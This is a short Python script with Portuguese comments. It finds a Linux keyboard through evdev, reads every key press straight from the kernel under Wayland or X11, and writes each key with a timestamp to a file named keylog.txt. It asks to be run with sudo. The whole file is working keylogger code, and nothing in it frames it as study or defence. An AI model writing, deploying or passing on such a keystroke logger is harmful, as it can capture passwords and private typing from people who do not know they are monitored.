import evdev
import logging
import sys

# Configuração do Log
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def identificar_teclado():
    print("[*] Procurando teclado...")
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        # Tenta identificar o teclado pelas capacidades
        if 1 in device.capabilities() and 1 in device.capabilities()[1]: # Verifica se tem teclas (EV_KEY)
            if "keyboard" in device.name.lower():
                print(f"[+] Teclado detectado: {device.name} em {device.path}")
                return device.path
    return None

def main():
    path = identificar_teclado()
    if not path:
        print("[-] Nenhum teclado encontrado automaticamente.")
        # Fallback: Se não achar, tente forçar um (ex: '/dev/input/event0')
        return

    device = evdev.InputDevice(path)
    print(f"[*] Monitorando {device.path} (Funciona em Wayland/X11)")
    print("[!] Pressione CTRL+C para parar.")

    try:
        # Loop infinito lendo eventos direto do kernel
        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                # event.value 1 = Pressionou, 0 = Soltou
                if event.value == 1: 
                    key_str = evdev.ecodes.KEY[event.code]
                    logging.info(key_str)
                    # print(key_str) # Descomente para ver na tela (debug)
                    
    except KeyboardInterrupt:
        print("\n[*] Encerrado.")
    except PermissionError:
        print("\n[!] Erro: Você precisa rodar como SUDO.")

if __name__ == "__main__":
    main()